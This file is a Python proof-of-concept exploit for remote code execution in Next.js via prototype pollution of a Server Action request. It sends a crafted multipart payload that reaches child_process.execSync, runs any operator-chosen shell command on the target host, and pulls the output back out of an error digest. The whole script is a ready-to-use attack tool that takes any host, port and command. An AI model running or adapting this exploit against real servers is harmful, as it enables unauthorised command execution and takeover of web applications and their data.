#Script by LunchM0n3y
#!/usr/bin/env python3
import argparse
import requests
import json
import re

def send_exploit(host, port, payload, timeout=10):
    url = f"http://{host}:{port}/"
    
    
    part0_dict = {
        "then": "$1:__proto__:then",
        "status": "resolved_model",
        "reason": -1,
        "value": '{"then":"$B1337"}',
        "_response": {
            "_prefix": f"var res=process.mainModule.require('child_process').execSync('{payload}',{{'timeout':5000}}).toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'), {{digest:`${{res}}`}});",
            "_chunks": "$Q2",
            "_formData": {
                "get": "$1:constructor:constructor"
            }
        }
    }
    
    
    part0_json = json.dumps(part0_dict, indent=2)
    
    boundary = '----WebKitFormBoundaryx8jO2oVc6SWP3Sad'
    body = f"""------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r
Content-Disposition: form-data; name="0"\r
\r
{part0_json}\r
------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r
Content-Disposition: form-data; name="1"\r
\r
"$@0"\r
------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r
Content-Disposition: form-data; name="2"\r
\r
[]\r
------WebKitFormBoundaryx8jO2oVc6SWP3Sad--\r
"""
    
    headers = {
        'Host': f'{host}:{port}',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 Assetnote/1.0.0',
        'Next-Action': 'x',
        'X-Nextjs-Request-Id': 'b5dce965',
        'Content-Type': f'multipart/form-data; boundary={boundary}',
        'X-Nextjs-Html-Request-Id': 'SSTMXm7OJ_g0Ncx6jpQt9',
        'Content-Length': str(len(body))
    }
    
    print(f"[*] Target URL: {url}")
    print(f"[*] Multipart boundary: {boundary}")
    print(f"[*] Body length: {len(body)}")
    print(f"[*] Request headers: {headers}")
    print(f"[*] Timeout set to: {timeout}s")
    print(f"[*] Sending request...")
    
    try:
        response = requests.post(url, data=body, headers=headers, verify=False, timeout=timeout, allow_redirects=False)
        print(f"[+] Response Status: {response.status_code}")
        print(f"[+] Response Headers: {dict(response.headers)}")
        print(f"[+] Response Body: {response.text[:500]}...")  
        # Look for 'digest' in body for command output
        if 'digest' in response.text.lower():
            print("[+] Potential RCE success! Check 'digest' for output (e.g., username).")
            # Extract digest if possible
            match = re.search(r'"digest"\s*:\s*"([^"]*)"', response.text)
            if match:
                print(f"[+] Extracted digest: {match.group(1)}")
            else:
                print("[-] Digest found but couldn't parse value.")
        else:
            print("[-] No 'digest' found; server may not be vulnerable or output is suppressed.")
    except requests.exceptions.Timeout:
        print(f"[-] Request timed out after {timeout}s. Server slow, unreachable, or blocking.")
    except requests.exceptions.ConnectionError as e:
        print(f"[-] Connection error: {e}. Check if host/port is open.")
    except Exception as e:
        print(f"[-] Unexpected error: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Next.js RCE POC via Prototype Pollution (Fixed with Manual Multipart & Pretty JSON)")
    parser.add_argument('--host', default='localhost', help='Target host (default: localhost)')
    parser.add_argument('--port', type=int, default=3000, help='Target port (default: 3000)')
    parser.add_argument('--payload', default='id', help='Command to execute (default: id)')
    parser.add_argument('--timeout', type=int, default=10, help='Request timeout in seconds (default: 10)')
    args = parser.parse_args()
    
    print(f"[*] Sending exploit to {args.host}:{args.port} with payload: '{args.payload}'")
    send_exploit(args.host, args.port, args.payload, args.timeout)
